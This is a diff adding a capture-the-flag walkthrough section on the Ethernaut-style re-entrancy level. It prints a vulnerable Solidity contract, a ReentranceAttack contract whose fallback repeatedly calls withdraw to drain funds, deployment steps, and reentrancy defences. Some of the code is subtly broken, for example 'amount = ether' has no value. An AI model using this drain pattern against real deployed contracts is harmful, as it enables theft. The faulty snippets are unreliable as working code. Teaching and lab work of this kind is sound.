@@ -659,3 +659,111 @@ await contract._king() // get the current king
 await contract._king() // get the king
 
 ---
+### 10. Re-entrancy  
+
+>The goal of this level is for you to steal all the funds from the contract.
+
+This is an important attack type, that became famous with the [DAO Attack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). After the Attack Ethereum forked to undo the malicious transaction. It became: Ethereum and Ethereum Classic. Ethereum Classic kept the malicious transaction. Its an important point in the history of Ethereum where the transaction was undone by individuals. 
+
+Here are important background information and then an overview of the smart contract we'll be hacking for this level.
+- Untrusted contracts can execute code where you least expect it.
+- Fallback methods
+- Throw/revert bubbling
+- Sometimes the best way to attack a contract is with another contract.
+
+Here's the smart contract that contains the re-rentrancy vulnerability:
+
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract Reentrance {
+  
+  using SafeMath for uint256;
+  mapping(address => uint) public balances; // internal recording 
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) { // internal helper 
+    return balances[_who];
+  }
+
+  // the amount is sent out of the account before the state var is updated!
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}(""); // one of the ways to send money 
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount; // update the internal balance recording 
+    }
+  }
+
+  receive() external payable {}
+}
+``` 
+
+The hack to the contract will be by writing another smart contract that will take advantage of the vulnerability.
+
+Wr create a recursive re-rentrancy loop. In this loop we withdraw the funds before the balanaces are updated. 
+
+####  Solution:
+1. Open Remix and import the smart contract. Change the safemath libary location:
+"import https://github/openzeppelin/contracts/math/SafeMath.sol"
+change receive to fallback 
+2. create a new smart contract called ReentranceAttack.sol
+3. here is the code for the ReentranceAttack.sol. deploy the contract with some ether (you will need to pay for gas)
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import './Reentrance.sol';
+
+contract ReentranceAttack {
+  
+  Reentrance public reentranceContract;
+  uint public amount =  ether; // withdraw each time
+
+  constructor(address _reentranceContractAddress) public {
+    reentranceContract = Reentrance(_reentranceContractAddress);
+  }
+
+  function donateToTarget() public {
+    reentranceContract.donate.value(amount).gas(4000000)(address(this)); 
+}
+
+  fallback( ) external payable  {  
+    if (address(reentranceContract).balance != 0){
+      reentranceContract.withdraw(amount);
+    }
+  }
+
+}
+``` 
+4. add some funds to the vulnerability contract. 
+5. execute the function on your attack function. 
+
+**how to prevent the attack:**
+- make sure to update the state variable before you make a function call to an external contract. this is also called as "checks and effects best practice on solidity."
+- mutex: puts a lock on a contract state and then only the owner can unlock. this ensures that only a signle funtion is execute at the same time. (have a modifer that checks if the contract is locked or not. locked meaning that theres a function call thats curently executing.) this way someone can not call the function recursively while the function is already executing. heres how the code looks like:
+
+```
+bool internal locked;
+
+// add this modifier to the withdraw func
+modifier noReentrancy{
+  require(!locked, "no more re-rentrancy");
+  locked = true;
+  _;
+  locked = false;
+}
+``` 
+
+
+
